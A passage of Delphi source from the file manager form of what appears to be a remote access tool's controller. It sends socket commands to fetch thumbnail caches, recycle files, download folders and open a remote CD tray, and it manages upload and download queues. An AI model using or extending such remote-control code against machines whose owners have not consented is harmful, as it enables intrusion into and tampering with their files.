        SendData(NewSocket,'GetThumbs|' + Edit1.Text + 'thumbs.db');
      end;

    end;
  end else begin
    Listview1.ViewStyle := vsReport;
    UpdateFileIcons;
  end;
end;

procedure TFileManager.Recycle1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Recycle|' + Edit1.Text + listview1.Items[Number].Caption);
  end;
end;




procedure TFileManager.Download1Click(Sender: TObject);
var
  i: integer;
  li: tlistitem;
  tmp: string;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not Listview1.Items[i].Selected then Continue;

    li := ClientForm.FindTransferManager(MainSocket,SocketData).ListView1.Items.Add;
    li.Caption := Listview1.Items[i].Caption;

    if Settings.CheckBox1.Checked then begin
      Tmp := includetrailingbackslash(Edit1.Text);
      Delete(Tmp,1,3);
      Li.SubItems.Add(SocketData.DownloadPath + Tmp + Listview1.Items[i].Caption);
    end else begin
      Li.SubItems.Add(SocketData.DownloadPath + Listview1.Items[i].Caption);
    end;

    Li.SubItems.Add(Edit1.Text + Listview1.Items[i].Caption);
    Li.SubItems.Add(Listview1.Items[i].SubItems[0]);
    Li.SubItems.Add('0');
    Li.SubItems.Add('0');
    Li.SubItems.Add('00:00:00');
    Li.SubItems.Add('Pending');
    Li.ImageIndex := 18;

  end;
end;

function FindNextItem(Listview: TListview): TListItem;
var
  i: integer;
begin
  result := nil;
  for i := 0 to Listview.Items.Count -1 do begin
    if Listview.Items[i].SubItems[6] = 'Pending' then begin
      Result := Listview.Items[i];
      exit;
    end;
  end;
end;

function GetFileSize(FileName: string): integer;
var
  Handle: THandle;
begin
  Result := 0;
  Handle := CreateFile(pchar(FileName),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if Handle <> INVALID_HANDLE_VALUE then Result := windows.GetFileSize(Handle,nil);
  CloseHandle(handle);
end;

procedure TFileManager.Upload1Click(Sender: TObject);
var
  i: integer;
  Li: TListItem;
begin
  if not ClientForm.opendialog1.Execute then exit;

  for i := 0 to ClientForm.opendialog1.Files.Count -1 do begin
    Li := ClientForm.FindTransferManager(MainSocket,SocketData).ListView1.Items.Add;
    Li.Caption := extractfilename(ClientForm.opendialog1.Files[i]);
    Li.SubItems.Add(ClientForm.opendialog1.Files[i]);
    Li.SubItems.Add(Edit1.Text + extractfilename(ClientForm.opendialog1.Files[i]));
    Li.SubItems.Add(FileSizeToStr(GetFileSize(ClientForm.opendialog1.Files[i])));
    Li.SubItems.Add('0');
    Li.SubItems.Add('0');
    Li.SubItems.Add('00:00:00');
    Li.SubItems.Add('Pending');
    Li.ImageIndex := 17;
  end;

end;

procedure TFileManager.MenuItem9Click(Sender: TObject);
var
  Folder: string;
begin
  Folder := GetFullPath(Treeview1.Selected);
  Delete(Folder,1,12);
  SendData(NewSocket,'DownloadFolder|' + Folder);
end;

procedure TFileManager.ListView1CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Listview1.ViewStyle = vsReport then Listview1.Canvas.Brush.Color := clWhite;
end;

procedure TFileManager.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
    UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|FileManagerSocket|' + inttostr(Self.Handle));
end;

procedure TFileManager.StatusBar1DrawPanel(StatusBar: TStatusBar;
  Panel: TStatusPanel; const Rect: TRect);
begin
  if Panel = StatusBar.Panels[1] then
  with ProgressBar1 do begin
    Top := Rect.Top;
    Left := Rect.Left;
    Width := Rect.Right - Rect.Left - 15;
    Height := Rect.Bottom - Rect.Top;
  end;
end;

procedure TFileManager.FormResize(Sender: TObject);
begin
  Statusbar1.Panels[0].Width := Width - 150;
end;

procedure TFileManager.OpenTray1Click(Sender: TObject);
var
  Folder: string;
begin
  Folder := GetFullPath(Treeview1.Selected);
  Delete(Folder,1,12);
  SendData(NewSocket,'OpenTray|' + Folder);
end;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
begin

  if (LastSortedColumn.Caption = 'Size') or (LastSortedColumn.Caption = 'Date Modified') then begin

      if LastSortedColumn.Caption = 'Size' then begin

        num := Item1.StateIndex; 
        n1 := StrToInt64(FileSizeList.Strings[Num]);

        num := Item2.StateIndex;
        n2 := StrToInt64(FileSizeList.Strings[Num]);

      end;

      if LastSortedColumn.Caption = 'Date Modified' then begin
        Result := CompareDateTime(StrToDateTime(Item1.SubItems[3]),StrToDateTime(Item2.SubItems[3]));
        if not Ascending then Result := - Result;
        exit;
      end;

      if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;

  end else begin
    Result := 0;
    if Data = 0 then begin
      Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    end else begin
      Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
    end;
  end;

  if not Ascending then Result := -Result;
end;

procedure TFileManager.ListView1ColumnClick(Sender: TObject; Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to Listview1.Columns.Count -1 do Listview1.Column[i].ImageIndex := -1;
  if Ascending then Column.ImageIndex := 1 else Column.ImageIndex := 0;
  LastSortedColumn := Column;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFileManager.ClickTheColumn;
var
  i: integer;
begin
  if LastSortedColumn = nil then exit;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

end.
